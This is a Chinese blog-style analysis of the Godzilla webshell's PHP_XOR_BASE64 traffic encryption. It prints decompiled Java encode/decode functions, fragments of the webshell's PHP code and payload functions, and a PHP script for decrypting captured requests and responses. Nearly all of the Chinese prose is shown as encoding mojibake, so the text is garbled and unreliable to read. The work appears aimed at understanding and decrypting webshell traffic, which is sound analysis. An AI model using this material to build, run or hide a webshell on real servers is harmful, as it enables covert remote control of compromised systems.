å…¥å‡½æ•°åå’Œå‚æ•°ã€‚ä»¥methodName=xxxxçš„å½¢å¼ã€‚ï¼ˆå‘½ä»¤æ‰§è¡Œä¼šæ˜¯cmdline=xxx&amp;methodName=xxxï¼‰ åŠ å¯†è¿‡ç¨‹å®¢æˆ·ç«¯å‘é€çš„requestï¼š å…ˆå¯¹åŸå§‹æ•°æ®è¿›è¡Œbase64çš„ç¼–ç  ç„¶åå’Œå¯†é’¥keyæŒ‰ä½å¼‚æˆ–ï¼ˆè¿™ä¸ªå¯†é’¥keyæ˜¯å–shellsettingæ—¶è‡ªå®šä¹‰è®¾ç½®çš„é‚£ä¸ªå¯†é’¥çš„md5å€¼å‰16ä½ã€‚ï¼‰ å°†å¾—åˆ°çš„æ•°æ®å†base64ä¸€æ¬¡ï¼Œå†urlç¼–ç ä¸€æ¬¡ã€‚ æœ€åå°†å¾—åˆ°çš„æ•°æ®ä¸å¯†ç è¿›è¡Œæ‹¼æ¥ã€‚ ç›¸å¯¹åº”çš„åŠ å¯†å‡½æ•° 1234567891011121314151617181920212223242526272829303132public byte[] encode(byte[] data) &#123; /* */ try &#123; /* 53 */ return E(data); /* 54 */ &#125; catch (Exception e) &#123; /* 55 */ Log.error(e); /* 56 */ return null; /* */ &#125; /* */ &#125; public byte[] E(byte[] data) &#123; /* 83 */ byte[] cs = functions.base64Encode(data).getBytes(); /* 84 */ int len = cs.length; /* 85 */ for (int i = 0; i &lt; len; i++) &#123; /* 86 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 88 */ return (String.valueOf(this.pass) + &quot;=&quot; + URLEncoder.encode(functions.base64Encode((new String(cs)).getBytes()))).getBytes(); /* */ &#125; æœåŠ¡å™¨ç«¯çš„respondï¼š è§£å¯†è¿‡ç¨‹ å…ˆè°ƒç”¨findStrå‡½æ•°åˆ é™¤æœåŠ¡å™¨å“åº”æ•°æ®å·¦å³é™„åŠ çš„æ··æ·†å­—ç¬¦ä¸²ï¼ˆç”Ÿæˆshellæ—¶è®¾ç½®çš„å‚æ•°ï¼Œè‡ªå®šä¹‰æ·»åŠ çš„å†—ä½™æ•°æ®ï¼‰ å¯¹äºPHP_XOR_BASE64åŠ å¯†æ–¹å¼æ¥è¯´ï¼Œå‰åé»˜è®¤å„é™„åŠ äº†16ä½çš„æ··æ·†å­—ç¬¦ï¼šå°†å¯†ç å’Œå¯†é’¥è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡Œmd5çš„è®¡ç®—ã€‚ä¸€å…±32ä½ã€‚æœåŠ¡å™¨ç«¯è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œæ‹¼æ¥ã€‚å³æœåŠ¡å™¨ç«¯è¿”å›æ•°æ® &#x3D; md5å‰16ä½+åŠ å¯†æ•°æ®+md5å16ä½ã€‚ï¼ˆåŠ å¯†æ•°æ®å¯ä»¥é€šè¿‡å¯¹æœåŠ¡å™¨ç«¯çš„è§£å¯†ç®—æ³•è¿›è¡Œè§£å¯†ï¼‰ å°†å¾—åˆ°çš„æ•°æ®è¿›è¡Œurlè§£ç ç„¶åbase64è§£ç  æœ€åå†å’Œshellè¿æ¥å¯†é’¥md5å€¼çš„å‰16ä½æŒ‰ä½å¼‚æˆ–ï¼Œå°†ç»“æœæœ€ç»ˆbase64è§£ç å³å®Œæˆå“åº”æ•°æ®çš„è§£å¯†ã€‚ ç›¸å¯¹åº”çš„è§£å¯†å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041# å…ˆåˆ é™¤dataçš„æ··æ·†æ•°æ®public String findStr(byte[] respResult) &#123; String htmlString = new String(respResult); return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); &#125;# æŒ‰ä½å¼‚æˆ–ï¼ˆè§£å¯†base64ï¼‰ public byte[] D(String data) &#123; byte[] cs = functions.base64Decode(data); int len = cs.length; // åŸå§‹æ•°æ®ä¸å¯†é’¥md5çš„å‰16ä½æŒ‰ä½å¼‚æˆ– for (int i = 0; i &lt; len; i++) &#123; cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); &#125; return functions.base64Decode(new String(cs));&#125;# è§£å¯† public byte[] decode(byte[] data) &#123; if (data != null &amp;&amp; data.length &gt; 0) &#123; try &#123; return D(findStr(data)); //å…ˆåˆ é™¤dataçš„æ··æ·†å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨Då‡½æ•°è¿›è¡Œè§£å¯† &#125; catch (Exception e) &#123; Log.error(e); return null; &#125; &#125; return data;&#125; è§£å¯†ä»£ç  è‡ªå·±ç®€å•çš„å†™äº†ä¸€ä¸ªï¼Œå¯ä»¥å®ç°åŠŸèƒ½ï¼Œä½†æ¯”è¾ƒç²—ç³™ 1234567891011121314151617181920212223242526&lt;?phpfunction encode($D, $K)&#123; for ($i = 0; $i &lt; strlen($D); $i++) &#123; $D[$i] = $D[$i] ^ $K[$i + 1 &amp; 0xF]; &#125; return $D;&#125;$pass = &#x27;pass&#x27;;$payloadName = &#x27;payload&#x27;;$key = &#x27;3c6e0b8a9c15224a8228b9a98ca1531d&#x27;;//å®¢æˆ·ç«¯å‘é€è¯·æ±‚éƒ¨åˆ†çš„è§£å¯†$s = base64_decode(encode(base64_decode(urldecode(&quot;&quot;)), $key));//æœåŠ¡å™¨ç«¯å“åº”éƒ¨åˆ†çš„è§£å¯†ï¼ˆä¸éœ€è¦urlè§£ç ï¼›æœªåˆ é™¤å†—ä½™æ•°æ®ï¼‰//$s = base64_decode(encode(base64_decode(&quot;&quot;), $key));for ($i = 0; $i &lt; strlen($s); $i++) &#123; echo $s[$i];&#125; å“¥æ–¯æ‹‰åŠ å¯†åˆ†æåŠ å¯†shellè®¾ç½® å¯†ç ï¼šPostè¯·æ±‚ä¸­çš„å‚æ•°åç§°ï¼ˆé»˜è®¤å¯†ç ä¸ºpassï¼‰ å¯†é’¥ï¼šç”¨äºå¯¹è¯·æ±‚æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¸è¿‡åŠ å¯†è¿‡ç¨‹ä¸­å¹¶éç›´æ¥ä½¿ç”¨å¯†é’¥æ˜æ–‡ï¼Œè€Œæ˜¯è®¡ç®—å¯†é’¥çš„md5å€¼ï¼Œç„¶åå–å…¶å‰16ä½ç”¨äºåŠ å¯†è¿‡ç¨‹ æœ‰æ•ˆè½½è· åŠ å¯†å™¨ æ‰°ä¹±æ•°æ®ï¼šç”¨äºè‡ªå®šä¹‰HTTPè¯·æ±‚å¤´ï¼Œä»¥åŠåœ¨æœ€ç»ˆçš„è¯·æ±‚æ•°æ®å‰åé¢å¤–å†è¿½åŠ ä¸€äº›æ‰°ä¹±æ•°æ®ï¼Œè¿›ä¸€æ­¥é™ä½æµé‡çš„ç‰¹å¾ã€‚ å“¥æ–¯æ‹‰shellç§ç±»å“¥æ–¯æ‹‰æä¾›äº†ä¸‰ç§shellï¼Œåˆ†åˆ«æ˜¯javaã€C#ã€PHP æºä»£ç ä¸­ï¼Œä¹Ÿå¯¹åº”äº†è¿™ä¸‰ç§ç±»å‹ï¼šcshapAes, JavaAes, phpXor åˆ†æå®¢æˆ·ç«¯çš„åŠ å¯†ä»£ç ï¼Œæ‰¾åˆ°cryptionsï¼Œå› ä¸ºç”¨çš„æ˜¯phpçš„shellï¼Œæ‰€ä»¥åˆ†æphp shellçš„ä»£ç  åŠ å¯†æ–¹å¼ï¼Œé‡‡ç”¨çš„æ˜¯base64çš„å¼‚æˆ–åŠ å¯†ã€‚shells/cryptions/phpxor/template/base64.bin è¿™æ˜¯ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæå–å‡ºæ¥è¿›è¡Œåˆ†æ æ•´ä¸ªshellçš„åŸºæœ¬æ‰§è¡Œæµç¨‹æ˜¯ï¼šæœåŠ¡å™¨æ¥æ”¶åˆ°å“¥æ–¯æ‹‰å‘é€çš„ç¬¬ä¸€ä¸ªè¯·æ±‚åï¼Œç”±äºæ­¤æ—¶å°šæœªå»ºç«‹sessionï¼Œæ‰€ä»¥å°†POSTè¯·æ±‚æ•°æ®è§£å¯†åï¼ˆå¾—åˆ°çš„å†…å®¹ä¸ºshellæ“ä½œä¸­æ‰€éœ€è¦ç”¨åˆ°çš„ç›¸å…³phpå‡½æ•°å®šä¹‰ä»£ç ï¼‰å­˜å…¥sessionä¸­ï¼Œåç»­å“¥æ–¯æ‹‰åªä¼šæäº¤ç›¸å…³æ“ä½œå¯¹åº”çš„å‡½æ•°åç§°ï¼ˆå¦‚è·å–ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨å¯¹åº”çš„å‡½æ•°ä¸ºgetFileï¼‰å’Œç›¸å…³å‚æ•°ï¼Œè¿™æ ·å“¥æ–¯æ‹‰çš„ç›¸å…³æ“ä½œå°±ä¸éœ€è¦å‘é€å¤§é‡çš„è¯·æ±‚æ•°æ®ã€‚ 123echo substr(md5($P.$T),0,16);echo Q(E(@run($F),$T));echo substr(md5($P.$T),16); å®ƒå°†å¯†ç å’Œå¯†é’¥è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡Œmd5çš„è®¡ç®—ã€‚ä¸€å…±32ä½ã€‚æœåŠ¡å™¨ç«¯è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œä¼šå°†è¿™ä¸ªæ•°æ®çš„å‰16ä½å’Œå16ä½ä¸­é—´æ‹¼æ¥ä¸Šbase64ç­‰åŠ å¯†è¿‡çš„è¿”å›æ•°æ®ã€‚ æŠ“åŒ…åˆ†æ-æŸ¥çœ‹â€œæµ‹è¯•è¿æ¥â€æ“ä½œæ‰€å‘é€çš„æ•°æ®åŒ…è®¾ç½®ä»£ç†ï¼Œç”¨burpsuiteæ‹¦æˆªï¼ŒæŸ¥çœ‹äº§ç”Ÿäº†ä»€ä¹ˆæ•°æ®åŒ…ä»£ç†ç«¯å£è®¾ç½®ä¸º8888 æµ‹è¯•é“¾æ¥åï¼Œäº§ç”Ÿä¸‰ä¸ªæ•°æ®åŒ… ç¬¬1ä¸ªè¯·æ±‚ä¼šå‘é€å¤§é‡æ•°æ®ï¼Œè¯¥è¯·æ±‚ä¸å«æœ‰ä»»ä½•Cookieä¿¡æ¯ï¼ŒæœåŠ¡å™¨å“åº”æŠ¥æ–‡ä¸å«ä»»ä½•æ•°æ®ï¼Œä½†æ˜¯ä¼šè®¾ç½®PHPSESSIDï¼Œåç»­è¯·æ±‚éƒ½ä¼šè‡ªåŠ¨å¸¦ä¸Šè¯¥Cookieã€‚ ç¬¬2ã€3ä¸ªè¯·æ±‚å®Œå…¨ä¸€è‡´ï¼Œå¹¶ä¸”æ•°æ®é‡å¾ˆå°‘ï¼Œä¼šå¸¦ä¸ŠPHPSESSID ç¬¬ä¸€ä¸ªæ•°æ®åŒ…åˆ†æç‚¹å‡»æµ‹è¯•æŒ‰é’®ï¼Œä¼šè¿›è¡Œæ“ä½œï¼Œæ ¹æ®è¿™ä¸€ç‚¹å»æŸ¥çœ‹æºä»£ç ã€‚ æ ¹æ®uiçš„å¸ƒå±€ï¼Œæ‰¾åˆ°æµ‹è¯•æŒ‰é’®ç›¸å…³UIï¼Œå†å»è¿½æº¯åˆ°åŠŸèƒ½ä»£ç éƒ¨åˆ† å¦‚æœupdateTempShellEntity()ä¸º true åˆ™æ‰§è¡Œå‘ä¸‹æ‰§è¡Œï¼Œæ£€æŸ¥initShellOpertion()ï¼Œæ£€æŸ¥é€šè¿‡åï¼Œæ‰§è¡ŒgetPayloadModel().test() åˆ™è¿æ¥æˆåŠŸã€‚ å‡½æ•°updateTempShellEntity()çš„ä½œç”¨æ˜¯ï¼šæ£€æŸ¥shellsettingçš„é‚£äº›ä¿¡æ¯æ˜¯å¦å¡«å†™å®Œå…¨ã€‚urlï¼Œ passwordï¼ŒsecretKey ï¼Œpayload ï¼Œcryptionï¼Œ encoding å‡½æ•°initShellOpertion() æ‰¾åˆ°å‡½æ•°initShellOpertion()çš„ä½ç½®ï¼Œæ˜¯ShellEntityä¸­çš„ è·³åˆ°importä¸­ï¼ŒæŸ¥æ‰¾Shellentity å»ShellEntity.javaæ‰¾åˆ°å‡½æ•°initShellOpertion() tipï¼šå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä»¥æ³¨é‡Šçš„æ–¹å¼åœ¨ä»£ç åé¢æ ‡æ˜ æŸ¥çœ‹cryptionModel åˆå§‹åŒ–çš„å‡½æ•°init åœ¨ä¸Šè¿°init()å‡½æ•°ä¸­ï¼Œé¦–å…ˆåˆå§‹åŒ–äº†ä¸Šä¸‹æ–‡å¯¹è±¡ã€Httpå¯¹è±¡ã€å¯†é’¥ç­‰ä¿¡æ¯ï¼Œç„¶ååŠ è½½src\\shells\\payloads\\php\\assets\\payload.phpæ–‡ä»¶å†…å®¹ä½œä¸ºpayloadæ•°æ®ï¼ˆåˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿˜æœªè¿›è¡Œä»»ä½•åŠ å¯†æ“ä½œï¼‰ã€‚payload.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä¸­å®šä¹‰äº†shellæ‰€æœ‰åŠŸèƒ½æ‰€éœ€çš„ä¸€ç³»åˆ—å‡½æ•°ï¼Œå“¥æ–¯æ‹‰ç¬¬ä¸€æ¬¡è¿æ¥shellæ—¶ï¼Œå°†è¿™äº›å‡½æ•°å®šä¹‰å‘é€ç»™æœåŠ¡å™¨å¹¶å­˜å‚¨åœ¨sessionä¸­ï¼Œåç»­çš„shellæ“ä½œåªéœ€è¦å‘é€å‡½æ•°åç§°ä»¥åŠå¯¹åº”çš„å‡½æ•°å‚æ•°å³å¯ã€‚ æœ€ç»ˆç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„å‘é€ï¼Œæ˜¯é€šè¿‡shells/cryptions/phpXor/PhpXor.javaçš„init å‡½æ•°ï¼Œè¿™æ®µä»£ç å®ç°çš„ğŸ‘‡ æœ€ç»ˆPOSTè¯·æ±‚æ•°æ®&#x3D; å·¦è¾¹è¿½åŠ æ•°æ®+ç¼–ç åçš„åŸå§‹æ•°æ®+å³è¾¹è¿½åŠ æ•°æ® å…¶ä¸­encodeå‡½æ•°ğŸ‘‡ åŠ å¯†çš„è¿‡ç¨‹ 1234567891011121314151617181920212223242526272829303132public byte[] encode(byte[] data) &#123; /* */ try &#123; /* 53 */ return E(data); /* 54 */ &#125; catch (Exception e) &#123; /* 55 */ Log.error(e); /* 56 */ return null; /* */ &#125; /* */ &#125; public byte[] E(byte[] data) &#123; /* 83 */ byte[] cs = functions.base64Encode(data).getBytes(); /* 84 */ int len = cs.length; /* 85 */ for (int i = 0; i &lt; len; i++) &#123; /* 86 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 88 */ return (String.valueOf(this.pass) + &quot;=&quot; + URLEncoder.encode(functions.base64Encode((new String(cs)).getBytes()))).getBytes(); /* */ &#125; æ•°æ®çš„åŠ å¯†è¿‡ç¨‹æ˜¯ï¼šå…ˆå¯¹åŸå§‹æ•°æ®è¿›è¡Œbase64çš„ç¼–ç ï¼Œç„¶åå’Œå¯†é’¥keyæŒ‰ä½å¼‚æˆ–ï¼Œè¿™ä¸ªå¯†é’¥keyæ˜¯å–shellsettingæ—¶è‡ªå®šä¹‰è®¾ç½®çš„é‚£ä¸ªå¯†é’¥çš„md5å€¼å‰16ä½ã€‚ å°†å¾—åˆ°çš„æ•°æ®å†base64ä¸€æ¬¡ï¼Œå†urlç¼–ç ä¸€æ¬¡ã€‚æœ€åå°†å¾—åˆ°çš„æ•°æ®ä¸å¯†ç è¿›è¡Œæ‹¼æ¥ã€‚ ç»¼ä¸Šå¯çŸ¥ï¼Œå“¥æ–¯æ‹‰å‘é€çš„ç¬¬ä¸€ä¸ªPOSTè¯·æ±‚ä¸­ï¼Œè¯·æ±‚æ•°æ®çš„åŠ å¯†è¿‡ç¨‹ä¸ºï¼šå°†åŸå§‹æ•°æ®ï¼ˆå³shells/payloads/php/assets/payload.phpæ–‡ä»¶ï¼‰è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åä¸shellå¯†é’¥ï¼ˆç”Ÿæˆshellæ—¶è®¾ç½®çš„é‚£ä¸ªï¼Œåˆå§‹ä¸ºkeyï¼‰md5å€¼çš„å‰16ä½æŒ‰ä½å¼‚æˆ–ï¼Œå¾—åˆ°ç¼–ç æ•°æ®ï¼Œæœ€ç»ˆè¿˜éœ€è¦å¯¹æ•°æ®ç¼–ç è¿›è¡ŒURLç¼–ç ï¼Œæ‹¼æ¥ä¸Šshellå¯†ç ï¼ˆç”Ÿæˆshellæ—¶è®¾ç½®çš„é‚£ä¸ªï¼Œä½œä¸ºPOSTè¯·æ±‚å‚æ•°çš„é‚£ä¸ªï¼Œåˆå§‹ä¸ºpassï¼‰ã€‚ä½œä¸ºPOSTæŠ¥æ–‡è¯·æ±‚ä½“ï¼ŒPOSTåˆ°æœåŠ¡å™¨ã€‚ è§£å¯†è¿‡ç¨‹ä¸åŠ å¯†è¿‡ç¨‹æ­£å¥½ç›¸åï¼šä»pass=ç¼–ç æ•°æ®ä¸­æå–ç¼–ç æ•°æ®ï¼Œä¾æ¬¡ç»è¿‡URLè§£ç ç„¶åbase64è§£ç ï¼Œå†ä¸shellå¯†é’¥md5å€¼çš„å‰16ä½æŒ‰ä½å¼‚æˆ–ï¼Œæœ€åbase64è§£ç å³å¯å¾—åˆ°åŸå§‹è¯·æ±‚æ•°æ®ã€‚ ç¬¬äºŒä¸ªæ•°æ®åŒ…åˆ†æ(2å’Œ3æ•°æ®åŒ…æ˜¯ä¸€æ ·çš„) ç¬¬äºŒä¸ªæ•°æ®åŒ…çš„äº§ç”Ÿåœ¨this.payloadModel.test() æ‰¾åˆ°test()å‡½æ•° æ˜¯ä¸€ä¸ªå¸ƒå°”å‹çš„ã€‚æµ‹è¯•æˆåŠŸåï¼Œä¼šè¿”å›trueã€‚ifå‡½æ•°é¡ºåˆ©è¿è¡Œï¼Œè¿æ¥æˆåŠŸã€‚ 123if(this.payloadModel.test())&#123; state = true;&#125; trim() å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚ æŸ¥çœ‹evalFunc å‡½æ•°ï¼Œå‘é€äº†è¯·æ±‚ this.payloadModel.test()çš„æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼šè°ƒç”¨äº†evalFuncå‡½æ•°ã€‚è¯¥å‡½æ•°å°†æ•°æ®POSTç»™æœåŠ¡å™¨ï¼Œå¹¶è·å¾—æœåŠ¡å™¨çš„å“åº”ã€‚ 1byte[] result = evalFunc(null, &quot;test&quot;, parameter); // è·å¾—æœåŠ¡å™¨çš„å“åº” å°†æœåŠ¡å™¨çš„è¿”å›ç»“æœæ ¼å¼ä¿®æ”¹åï¼Œä¸okå¯¹æ¯”ï¼Œåˆ¤æ–­ä¸ºokåˆ™è¿æ¥æˆåŠŸã€‚ 1234567String codeString = new String(result); /* 200 */if (codeString.trim().equals(&quot;ok&quot;)) &#123; // å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼ä¿®æ”¹ï¼Œä½¿ä¹‹æ²¡æœ‰ç©ºæ ¼ã€‚æœåŠ¡å™¨è¿”å›okçš„è¯ï¼Œåˆ™è¿æ¥æˆåŠŸ /* 201 */ return true; /* */ &#125; è¯´æ˜åœ¨evalFuncå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå·²ç»å¾—åˆ°äº†æ˜æ–‡çš„æœåŠ¡å™¨è¿”å›æ•°æ®ï¼Œå› æ­¤æœåŠ¡å™¨è¿”å›æŠ¥æ–‡çš„è§£å¯†è¿‡ç¨‹è‚¯å®šæ˜¯åœ¨evalFuncå‡½æ•°ä¸­ã€‚ å°†evalFuncçš„å†…å®¹å•ç‹¬æå‡ºæ¥ 123456789101112131415public byte[] evalFunc(String className, String funcName, ReqParameter praameter) &#123; /* 90 */ if (className != null &amp;&amp; className.trim().length() &gt; 0) &#123; /* 91 */ praameter.add(&quot;codeName&quot;, className); /* */ &#125; /* 93 */ praameter.add(&quot;methodName&quot;, funcName); /* 94 */ byte[] data = praameter.format().getBytes(); /* 95 */ return this.http.sendHttpResponse(data).getResult(); //POSTåˆ°æœåŠ¡å™¨ï¼Œå¹¶è·å–æœåŠ¡å™¨å“åº” /* */ &#125; å®šä½åˆ°public HttpResponse sendHttpResponseå‡½æ•°ï¼Œæ¢ç©¶sendHttpResponseçš„æ‰§è¡Œè¿‡ç¨‹ã€‚æ‰¾åˆ°HttpResponseæ–‡ä»¶ï¼ˆutil/http/HttpResponse.javaï¼‰æŸ¥çœ‹æ˜¯å¦æœ‰è§£å¯†è¿‡ç¨‹ã€‚ï¼ˆå³è¿™ä¸€è¡Œè¿è¡Œçš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯æ˜æ–‡çš„â€œOKâ€ï¼Œç°åœ¨éœ€è¦æ¢ç©¶æ˜¯ä»å“ªé‡Œå¼€å§‹å˜æˆè§£å¯†åçš„æ˜æ–‡okï¼‰ 1this.result = this.shellEntity.getCryptionModel().decode(this.result); //è§£å¯†å“åº”æ•°æ® æ‰¾åˆ°decodeå‡½æ•°(shells&#x2F;cryptions&#x2F;phpXor&#x2F;PhpXor.java) è§£å¯†å‡½æ•°D 12345678910111213141516public byte[] D(String data) &#123; /* 91 */ byte[] cs = functions.base64Decode(data); /* 92 */ int len = cs.length; /* 93 */ // åŸå§‹æ•°æ®ä¸å¯†é’¥md5çš„å‰16ä½æŒ‰ä½å¼‚æˆ– for (int i = 0; i &lt; len; i++) &#123; /* 94 */ cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); /* */ &#125; /* 96 */ return functions.base64Decode(new String(cs)); /* */&#125; åˆ é™¤æ··æ·†å­—ç¬¦å‡½æ•°findStrï¼ˆå·¦å³è¿½åŠ çš„éƒ¨åˆ†ï¼Œè¿™ä¸ªä¾‹å­é‡Œæ²¡æœ‰è¿½åŠ ï¼‰ 1234567public String findStr(byte[] respResult) &#123; /* 99 */ String htmlString = new String(respResult); /* 100 */ return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); /* */&#125; ç”±ä¸Šè¿°ä»£ç å¯çŸ¥ï¼ŒæœåŠ¡å™¨å“åº”æ•°æ®è§£å¯†è¿‡ç¨‹å¹¶ä¸å¤æ‚ï¼Œå…ˆè°ƒç”¨findStrå‡½æ•°åˆ é™¤æœåŠ¡å™¨å“åº”æ•°æ®å·¦å³é™„åŠ çš„æ··æ·†å­—ç¬¦ä¸²ï¼ˆå¯¹äºPHP_XOR_BASE64åŠ å¯†æ–¹å¼æ¥è¯´ï¼Œå‰åå„é™„åŠ äº†16ä½çš„æ··æ·†å­—ç¬¦ï¼‰ï¼Œç„¶åå°†å¾—åˆ°çš„æ•°æ®è¿›è¡Œurlè§£ç ç„¶åbase64è§£ç ï¼Œæœ€åå†å’Œshellè¿æ¥å¯†é’¥md5å€¼çš„å‰16ä½æŒ‰ä½å¼‚æˆ–ï¼Œå°†ç»“æœæœ€ç»ˆbase64è§£ç å³å®Œæˆå“åº”æ•°æ®çš„è§£å¯†ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æ˜ç™½äº†å“¥æ–¯æ‹‰çš„PHP_XOR_BASE64åŠ å¯†shellï¼Œåœ¨æµ‹è¯•è¿æ¥è¿‡ç¨‹ä¸­äº§ç”ŸPOSTè¯·æ±‚å’Œå“åº”æ•°æ®çš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹ã€‚å“¥æ–¯æ‹‰çš„å…¶ä»–shellåŠŸèƒ½ï¼Œé™¤äº†äº§ç”Ÿçš„POSTè¯·æ±‚å†…å®¹ä¸åŒå¤–ï¼Œæ•°æ®çš„åŠ è§£å¯†è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·çš„ã€‚ è§£å¯†éƒ¨åˆ†æ¶‰åŠåˆ°çš„å‡½æ•°ï¼ˆå¯ä»¥è¿è¡Œçš„è§£å¯†ä»£ç ï¼Œåœ¨æ¦‚è¿°é‡Œé™„ä¸Šäº†ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041# å…ˆåˆ é™¤dataçš„æ··æ·†æ•°æ®public String findStr(byte[] respResult) &#123; String htmlString = new String(respResult); return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight); &#125;# æŒ‰ä½å¼‚æˆ–ï¼ˆè§£å¯†base64ï¼‰public byte[] D(String data) &#123; byte[] cs = functions.base64Decode(data); int len = cs.length; // åŸå§‹æ•°æ®ä¸å¯†é’¥md5çš„å‰16ä½æŒ‰ä½å¼‚æˆ– for (int i = 0; i &lt; len; i++) &#123; cs[i] = (byte) (cs[i] ^ this.key[i + 1 &amp; 0xF]); &#125; return functions.base64Decode(new String(cs));&#125;# è§£å¯†public byte[] decode(byte[] data) &#123; if (data != null &amp;&amp; data.length &gt; 0) &#123; try &#123; return D(findStr(data)); //å…ˆåˆ é™¤dataçš„æ··æ·†å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨Då‡½æ•°è¿›è¡Œè§£å¯† &#125; catch (Exception e) &#123; Log.error(e); return null; &#125; &#125; return data;&#125; ç¬¬ä¸€ä¸ªæ•°æ®åŒ…è¯·æ±‚å†…å®¹æ˜¯payload.php ç¬¬äºŒã€ä¸‰ä¸ªæ•°æ®åŒ…è¯·æ±‚2ã€3æ•°æ®åŒ…è¯·æ±‚ä¸€æ · æŠ“åŒ…åˆ†æ-è¿›å…¥shellçš„æ•°æ®åŒ…è¿›å…¥shellåï¼Œä¼šäº§ç”Ÿä¸‰ä¸ªæ•°æ®åŒ… ç¬¬ä¸€ä¸ªæ•°æ®åŒ…è§£ç åå‘ç°ï¼Œæ•°æ®åŒ…å†…å®¹æ˜¯payload.php çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯payloadåŠŸèƒ½å‡½æ•°ã€‚ä¹‹æ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°†payload.phpå†…å®¹ä¼ å…¥ï¼Œç›®çš„æ˜¯åç»­çš„shellæ“ä½œè¯·æ±‚åŠŸèƒ½çš„æ—¶å€™ï¼Œåªéœ€è¦å‘é€å‡½æ•°åç§°ä»¥åŠå¯¹åº”çš„å‡½æ•°å‚æ•°å³å¯ã€‚ä¸éœ€è¦å†è¯·æ±‚ä¸€å¤§é•¿ä¸²æ•°æ®åŒ…ã€‚ ç¬¬äºŒä¸ªæ•°æ®åŒ…è§£ç åå‘ç°ï¼Œæ•°æ®åŒ…å†…å®¹æ˜¯methodName=testï¼Œä»–äº§ç”Ÿäºthis.payloadModel.test()çš„evalå‡½æ•°ä¸­ 1234567891011121314151617181920212223242526272829// this.payloadModel.test()çš„test()å‡½æ•°åŠŸèƒ½byte[] result = evalFunc(null, &quot;test&quot;, parameter); // è·å¾—æœåŠ¡å™¨çš„å“åº”String codeString = new String(result); if (codeString.trim().equals(&quot;ok&quot;)) &#123; // å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼ä¿®æ”¹ï¼Œä½¿ä¹‹æ²¡æœ‰ç©ºæ ¼ã€‚æœåŠ¡å™¨è¿”å›okçš„è¯ï¼Œåˆ™è¿æ¥æˆåŠŸ return true; &#125;// eval å‡½æ•° public byte[] evalFunc(String className, String funcName, ReqParameter praameter) &#123; if (className != null &amp;&amp; className.trim().length() &gt; 0) &#123; praameter.add(&quot;codeName&quot;, className); &#125; praameter.add(&quot;methodName&quot;, funcName); byte[] data = praameter.format().getBytes(); return this.http.sendHttpResponse(data).getResult(); //POSTåˆ°æœåŠ¡å™¨ï¼Œå¹¶è·å–æœåŠ¡å™¨å“åº” &#125; å¯ä»¥åˆ°payload.phpä¸­ï¼Œå»æŸ¥æ‰¾testå‡½æ•°çš„å†…å®¹ 123function test()&#123; return &quot;ok&quot;;&#125; æ ¹æ®ä¸Šé¢çš„å‡½æ•°å¯ä»¥åˆ†æå¾—åˆ°ï¼štestå‡½æ•°è°ƒç”¨äº†evalå‡½æ•°ï¼Œevalå‡½æ•°å°†ä¼ è¿›çš„funcNameå¯¹åº”çš„å°±æ˜¯payload.phpä¸­çš„åŠŸèƒ½å‡½æ•°ã€‚evalå°†å»æ‰§è¡Œpayload.phpé‡Œé¢çš„testå‡½æ•°ã€‚å¾—åˆ°çš„ç»“æœæ˜¯è¿”å›äº†OKã€‚evalå‡½æ•°å†å°†è¿™ä¸ªç»“æœå­˜å…¥byte[] resultã€‚this.payloadModel.test()çš„test()å‡½æ•°ä¼šå¯¹æ¯”ç»“æœï¼Œå¦‚æœå’Œokå€¼ä¸€æ ·ï¼Œåˆ™ä»£è¡¨è¿æ¥æˆåŠŸã€‚ ç¬¬ä¸‰ä¸ªæ•°æ®åŒ…è§£ç åå‘ç°ï¼Œæ•°æ®åŒ…å†…å®¹æ˜¯methodName=getBasicsInfo å’Œç¬¬äºŒä¸ªæ•°æ®åŒ…åˆ†ææ€è·¯ä¸€è‡´ï¼Œè¿™é‡Œçš„getBasicsInfoä¹Ÿæ˜¯payload.phpä¸­çš„å‡½æ•°ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼Œæ˜¾ç¤ºæ”»å‡»ç›®æ ‡çš„åŸºç¡€ä¿¡æ¯ã€‚åŒ…æ‹¬phpä¿¡æ¯ã€ç”¨æˆ·ã€ç¼–ç ç­‰ä¸€ç³»åˆ—ä¿¡æ¯ã€‚ 